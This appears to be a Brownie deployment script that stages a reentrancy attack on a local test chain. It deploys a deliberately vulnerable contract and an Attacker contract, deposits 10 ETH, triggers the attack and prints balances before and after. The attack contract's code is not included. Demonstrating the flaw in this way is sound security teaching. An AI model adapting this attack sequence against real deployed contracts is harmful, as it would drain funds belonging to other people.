from brownie import accounts, ReentrancyVulnerableContract, Attacker

ETH = 10**18


def main():
    def _show_balance():
        print("-----------------------------------------")
        # Show balance of ReentrancyVulnerableContract
        print(
            f"ReentrancyVulnerableContract balance: {vulnerable_contract.balance()/ETH}"
        )
        print(f"Attacker balance: {attacker.balance()/ETH}")
        # Show balance of accounts
        print(f"Account[0] balance: {accounts[0].balance()/ETH}")
        print(f"Account[1] balance: {accounts[1].balance()/ETH}")
        print("-----------------------------------------")

    # Account[0] Deploy ReentrancyVulnerableContract
    vulnerable_contract = ReentrancyVulnerableContract.deploy({"from": accounts[0]})
    # print('Deploy ReentrancyVulnerableContract')

    # Account[1] Deploy Attacker
    attacker = Attacker.deploy({"from": accounts[1]})
    # print('Deploy Attacker')

    # Account[0] deposit 10 ETH to ReentrancyVulnerableContract
    vulnerable_contract.depositFunds({"from": accounts[0], "value": 10 * ETH})
    print("Deposit 10 ETH from Accont[0] to ReentrancyVulnerableContract")

    _show_balance()

    print("Start Attacking...")
    # Call Attack function with vulnerable_contract address
    attacker.attack(vulnerable_contract, {"from": accounts[1], "value": 10 * ETH})
    print("After Attacking...")

    _show_balance()
